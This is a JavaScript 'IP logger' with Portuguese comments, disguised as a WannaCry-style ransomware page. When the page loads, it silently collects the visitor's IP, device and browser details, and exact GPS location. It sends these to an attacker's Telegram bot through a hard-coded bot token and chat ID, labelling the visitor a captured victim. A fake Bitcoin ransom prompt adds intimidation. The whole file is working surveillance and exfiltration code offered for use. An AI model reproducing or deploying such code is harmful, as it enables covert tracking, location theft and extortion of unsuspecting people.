// ============================================
// IP LOGGER + TELEGRAM + GEOLOCALIZAÇÃO + SCREENSHOT
// ============================================

const BOT_TOKEN = "8819910333:AAGxrE0I0KQy4DJtmJg5sGIWQqYBfOpPb1w";
const CHAT_ID = "8551438856";

// ============================================
// 1. PEGAR IP
// ============================================
async function getIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch {
        return 'Não foi possível obter IP';
    }
}

// ============================================
// 2. PEGAR DADOS DO NAVEGADOR/DISPOSITIVO
// ============================================
function getBrowserData() {
    const data = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screenWidth: screen.width,
        screenHeight: screen.height,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        referrer: document.referrer || 'Direto',
        url: window.location.href,
        timestamp: new Date().toLocaleString('pt-BR')
    };
    return data;
}

// ============================================
// 3. GEOLOCALIZAÇÃO EXATA (GPS)
// ============================================
function getGeolocation() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            resolve({ status: '❌ Geolocalização não suportada' });
            return;
        }

        navigator.geolocation.getCurrentPosition(
            (position) => {
                const { latitude, longitude, accuracy } = position.coords;
                resolve({
                    status: '✅ Localização obtida',
                    latitude,
                    longitude,
                    accuracy: `${accuracy} metros`,
                    googleMaps: `https://www.google.com/maps?q=${latitude},${longitude}`
                });
            },
            (error) => {
                let msg = '❌ Permissão negada ou erro';
                if (error.code === 1) msg = '❌ Usuário negou a permissão de localização';
                if (error.code === 2) msg = '❌ Indisponível (sem sinal)';
                if (error.code === 3) msg = '❌ Timeout';
                resolve({ status: msg });
            }, {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            }
        );
    });
}

// ============================================
// 4. INFORMAÇÕES DO SMARTPHONE
// ============================================
function getSmartphoneInfo() {
    const ua = navigator.userAgent;
    const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(ua);
    const isIOS = /iPhone|iPad|iPod/i.test(ua);
    const isAndroid = /Android/i.test(ua);
    const isWindows = /Windows Phone/i.test(ua);

    let model = 'Desconhecido';
    if (isIOS) {
        const match = ua.match(/iPhone OS (\d+)_(\d+)/);
        if (match) model = `iPhone (iOS ${match[1]}.${match[2]})`;
        else model = 'iPhone (iOS desconhecido)';
    } else if (isAndroid) {
        const match = ua.match(/Android (\d+\.\d+)/);
        if (match) model = `Android ${match[1]}`;
        else model = 'Android (versão desconhecida)';
    } else if (isWindows) {
        model = 'Windows Phone';
    } else if (!isMobile) {
        model = '💻 Computador (não é smartphone)';
    }

    // Bateria (se disponível)
    let battery = '❌ Não disponível';
    if (navigator.getBattery) {
        try {
            navigator.getBattery().then(bat => {
                const level = Math.round(bat.level * 100);
                const charging = bat.charging ? '⚡ Carregando' : '🔋 Descarregando';
                battery = `${level}% (${charging})`;
            }).catch(() => {});
        } catch (e) {}
    }

    // Operadora (via Network Information API)
    let carrier = '❌ Não disponível';
    if (navigator.connection && navigator.connection.effectiveType) {
        carrier = `Tipo de rede: ${navigator.connection.effectiveType}`;
    }

    return {
        isMobile,
        model,
        battery,
        carrier,
        connectionType: navigator.connection ? navigator.connection.effectiveType : 'N/A',
        deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'N/A',
        cores: navigator.hardwareConcurrency || 'N/A'
    };
}

// ============================================
// 5. TIRAR PRINT DA TELA
// ============================================
async function captureScreenshot() {
    try {
        const canvas = document.createElement('canvas');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        const ctx = canvas.getContext('2d');
        ctx.fillStyle = '#0a0a2a';
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        ctx.fillStyle = '#ff0000';
        ctx.font = '30px Arial';
        ctx.fillText('🔒 ENCRYPTED', 20, 50);
        ctx.fillStyle = '#00ff41';
        ctx.font = '16px monospace';
        ctx.fillText(`IP: ${await getIP()}`, 20, 100);
        ctx.fillText(`Data: ${new Date().toLocaleString()}`, 20, 130);
        ctx.fillText('Seus arquivos foram criptografados!', 20, 170);
        return canvas.toDataURL('image/jpeg', 0.8);
    } catch {
        return null;
    }
}

// ============================================
// 6. ENVIAR TUDO PRO TELEGRAM
// ============================================
async function sendToTelegram(ip, browserData, geo, smartphone, screenshot) {
    let message = `
🕵️‍♂️ **NOVA VÍTIMA CAPTURADA** 💀

🌐 **IP:** ${ip}
📍 **Localização por IP:** https://ipinfo.io/${ip}

`;

    if (geo.status && geo.status.includes('✅')) {
        message += `
📍 **GEOLOCALIZAÇÃO EXATA (GPS):**
   ───────────────────────────
   ✅ **Status:** ${geo.status}
   🗺️ **Latitude:** ${geo.latitude}
   🗺️ **Longitude:** ${geo.longitude}
   🎯 **Precisão:** ${geo.accuracy}
   📍 **Google Maps:** ${geo.googleMaps}
   ───────────────────────────
`;
    } else {
        message += `📍 **Geolocalização:** ${geo.status || '❌ Não disponível'}\n`;
    }

    message += `

📱 **SMARTPHONE/DISPOSITIVO:**
   ───────────────────────────
   📱 **Modelo:** ${smartphone.model}
   🔋 **Bateria:** ${smartphone.battery}
   🌐 **Rede:** ${smartphone.carrier}
   📶 **Tipo de conexão:** ${smartphone.connectionType}
   💾 **Memória RAM:** ${smartphone.deviceMemory}
   🧠 **Núcleos:** ${smartphone.cores}
   ───────────────────────────

📊 **DADOS DO NAVEGADOR:**
   ───────────────────────────
   🖥️ **SO/Dispositivo:** ${browserData.userAgent}
   📐 **Tela:** ${browserData.screenWidth}x${browserData.screenHeight}px
   🌍 **Idioma:** ${browserData.language}
   🕰️ **Fuso:** ${browserData.timezone}
   🔗 **Referer:** ${browserData.referrer}
   📎 **URL:** ${browserData.url}
   ⏱️ **Data/Hora:** ${browserData.timestamp}
   ───────────────────────────

💀 **Ransomware WannaCry Style - IP Logger**
`;

    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown',
                disable_web_page_preview: true
            })
        });
        if (response.ok) {
            document.getElementById('status').textContent = '✅ Decryption key sent!';
            document.getElementById('status').style.color = '#00ff41';
        } else {
            document.getElementById('status').textContent = '❌ Failed to connect';
            document.getElementById('status').style.color = '#ff0000';
        }
    } catch {
        document.getElementById('status').textContent = '❌ Network error';
        document.getElementById('status').style.color = '#ff0000';
    }

    // Enviar screenshot (se tiver)
    if (screenshot) {
        try {
            const formData = new FormData();
            const blob = await fetch(screenshot).then(res => res.blob());
            formData.append('photo', blob, 'screenshot.jpg');
            formData.append('chat_id', CHAT_ID);
            formData.append('caption', '🖼️ Screenshot da tela da vítima');

            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
        } catch (e) {
            console.log('Erro ao enviar screenshot:', e);
        }
    }
}

// ============================================
// 7. FUNÇÃO PRINCIPAL
// ============================================
async function main() {
    const loading = document.getElementById('loading');
    const status = document.getElementById('status');

    loading.style.display = 'block';
    status.textContent = '📡 Coletando dados do sistema...';

    const ip = await getIP();
    const browserData = getBrowserData();
    const geo = await getGeolocation();
    const smartphone = getSmartphoneInfo();
    const screenshot = await captureScreenshot();

    status.textContent = '📤 Enviando para o servidor...';
    await sendToTelegram(ip, browserData, geo, smartphone, screenshot);

    setTimeout(() => {
        loading.style.display = 'none';
    }, 4000);
}

// ============================================
// 8. BOTÕES (troll)
// ============================================
function checkPayment() {
    alert('💰 Payment not detected!\n\nTry sending exactly $300 in Bitcoin to:\n1T5p7UMMngoj1plMvkpHjicRdfJNXj8LrLn');
}

function decrypt() {
    alert('🔓 Decrypting files...\n\nJust kidding! 😂\nYour IP and location were sent to the owner! 👀');
}

function aboutBitcoin() {
    alert('₿ Bitcoin is a cryptocurrency.\n\nCurrent price: ~$60,000 USD');
}

// ============================================
// 9. EXECUTAR
// ============================================
document.addEventListener('DOMContentLoaded', main);
